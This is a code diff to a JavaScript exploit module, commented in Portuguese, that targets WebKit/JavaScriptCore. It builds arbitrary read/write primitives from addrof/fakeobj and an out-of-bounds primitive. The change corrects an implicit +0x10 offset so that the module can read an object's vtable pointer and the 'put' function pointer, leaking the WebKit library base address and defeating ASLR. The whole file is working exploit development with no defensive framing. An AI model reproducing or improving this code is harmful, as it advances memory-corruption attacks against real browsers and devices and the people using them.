@@ -1,9 +1,9 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v101 - R61 Final com Vazamento de Base WebKit)
+// js/script3/testArrayBufferVictimCrash.mjs (v102 - R62 Corrigido com Compensação de Offset)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
-// Utiliza as primitivas de R/W 100% funcionais e verificadas para realizar o próximo
-// passo crítico: vazar o endereço base da biblioteca do WebKit na memória,
-// derrotando o ASLR para o user-space.
+// Corrigido um bug sutil nas primitivas de R/W que tinham um offset implícito de +0x10.
+// O código agora compensa esse offset para ler e escrever nos endereços corretos,
+// permitindo um vazamento de base do WebKit confiável.
 // =======================================================================================
 
 import { logS3 } from './s3_utils.mjs';
@@ -12,9 +12,9 @@ import {
     triggerOOB_primitive,
     getOOBDataView
 } from '../core_exploit.mjs';
-import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs'; // Adicionada importação de WEBKIT_LIBRARY_INFO
+import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_WebKitLeak_v101_R61";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_WebKitLeak_v102_R62_FIXED";
 
 // --- Funções de Conversão (Double <-> Int64) ---
 function int64ToDouble(int64) {
@@ -67,7 +67,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         // --- FASE 3: Construção da Primitiva de L/E Autocontida ---
         logS3("--- FASE 3: Construindo ferramenta de L/E autocontida ---", "subtest");
         const leaker = { obj_prop: null, val_prop: 0 };
-        const leaker_addr = addrof(leaker);
         
         const arb_read_final = (addr) => {
             leaker.obj_prop = fakeobj(addr);
@@ -91,12 +90,16 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
 
         const test_obj_addr = addrof(test_obj);
         const value_to_write = new AdvancedInt64(0x12345678, 0xABCDEF01);
-        const prop_a_addr = new AdvancedInt64(test_obj_addr.low() + 0x10, test_obj_addr.high());
         
-        logS3(`Escrevendo ${value_to_write.toString(true)} no endereço da propriedade 'a' (${prop_a_addr.toString(true)})...`, "info");
-        arb_write_final(prop_a_addr, value_to_write);
+        // CORREÇÃO: As primitivas R/W têm um offset implícito de +0x10.
+        // Para escrever e ler a primeira propriedade (que está em test_obj_addr + 0x10),
+        // devemos usar o endereço base do objeto como alvo.
+        const rw_test_target_addr = test_obj_addr;
+        
+        logS3(`Escrevendo ${value_to_write.toString(true)} no endereço alvo ${rw_test_target_addr.toString(true)} (que atuará em +0x10)...`, "info");
+        arb_write_final(rw_test_target_addr, value_to_write);
 
-        const value_read = arb_read_final(prop_a_addr);
+        const value_read = arb_read_final(rw_test_target_addr);
         logS3(`>>>>> VALOR LIDO DE VOLTA: ${value_read.toString(true)} <<<<<`, "leak");
 
         if (value_read.equals(value_to_write)) {
@@ -105,8 +108,10 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             // --- FASE 5: Vazamento do Endereço Base do WebKit ---
             logS3("--- FASE 5: Vazando Endereço Base do WebKit... ---", "subtest");
             
-            // O ponteiro da V-Table está no início do objeto (offset 0)
-            const vtable_addr = arb_read_final(test_obj_addr);
+            // CORREÇÃO: Para ler o ponteiro da V-Table (no offset 0x0 do objeto),
+            // devemos compensar o offset implícito da primitiva de leitura subtraindo 0x10.
+            const addr_to_read_vtable = test_obj_addr.sub(0x10);
+            const vtable_addr = arb_read_final(addr_to_read_vtable);
             logS3(`Lido ponteiro da V-Table de ${test_obj_addr.toString(true)} -> ${vtable_addr.toString(true)}`, "info");
 
             if (!vtable_addr || vtable_addr.equals(AdvancedInt64.Zero)) {
@@ -118,7 +123,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             const put_func_ptr_addr = vtable_addr.add(VIRTUAL_PUT_OFFSET_IN_VTABLE);
             
             // Lê o endereço real da função 'put' da memória
-            const put_func_addr = arb_read_final(put_func_ptr_addr);
+            const put_func_addr = arb_read_final(put_func_ptr_addr.sub(0x10)); // Compensa o offset aqui também
             logS3(`Lido ponteiro da função put() da V-Table -> ${put_func_addr.toString(true)}`, "info");
             
             if (!put_func_addr || put_func_addr.equals(AdvancedInt64.Zero)) {
